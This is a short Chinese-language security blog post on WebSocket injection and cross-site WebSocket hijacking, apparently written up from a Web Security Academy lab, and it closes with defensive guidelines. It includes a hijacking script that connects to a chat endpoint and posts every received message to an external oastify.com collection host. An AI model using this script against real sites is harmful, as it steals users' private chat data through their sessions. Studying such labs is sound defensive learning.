---
title:  "WebSockets注入"
excerpt: "WebSockets注入"
author: "lcc"
layout: single
tags:
  - 早期文档
categories:
  - web安全
---
# WebSockets注入

WebSockets 是通过 HTTP 启动的双向全双工通信协议。它们通常用于现代 Web 应用程序中的流数据和其他异步流量。简单来说，websocket常用于实时聊天



跨站WebSocket劫持：

跨站点 WebSocket 劫持（也称为跨域 WebSocket 劫持）涉及WebSocket 握手上的跨站点请求伪造 （CSRF） 漏洞。当WebSocket 握手请求仅依赖 HTTP cookie 进行会话处理并且不包含任何 CSRF 令牌或其他不可预测的值时，就会出现这种情况。

`Sec-WebSocket-Key` 标头包含一个随机值，以防止缓存代理时出错，并且不用于身份验证或会话处理目的。





WebScoket存在的漏洞：

- 由于后台在处理WebSocket的输入时未做校验导致存在各类型如XSS的问题，具体造成什么问题取决于后台如何处理，后台甚至有可能把输入拿来执行命令
- WebSocket劫持： 在比较重要的操作中，如果WebSocket 握手请求未加CSRF Token且仅有cookie，那么将容易受到 CSRF 的攻击

利用脚本：

```
<script>
    var ws = new WebSocket('wss://0a57002f0421f05780af2bf30072006a.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://xbcd2kq81huqee8x9qhi263twk2bq1eq.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

为了最大限度地降低 WebSockets 出现安全漏洞的风险，请使用以下准则：

- 使用 `wss://` 协议 （WebSockets over TLS）。
- 对 WebSockets 端点的 URL 进行硬编码，当然不要将用户可控制的数据合并到此 URL 中。
- 保护 WebSocket 握手消息免受 CSRF 攻击，以避免跨站 WebSockets 劫持漏洞。
- 将通过 WebSocket 接收的数据在两个方向上都视为不受信任。在服务器端和客户端安全地处理数据，以防止基于输入的漏洞，例如 SQL 注入和跨站点脚本。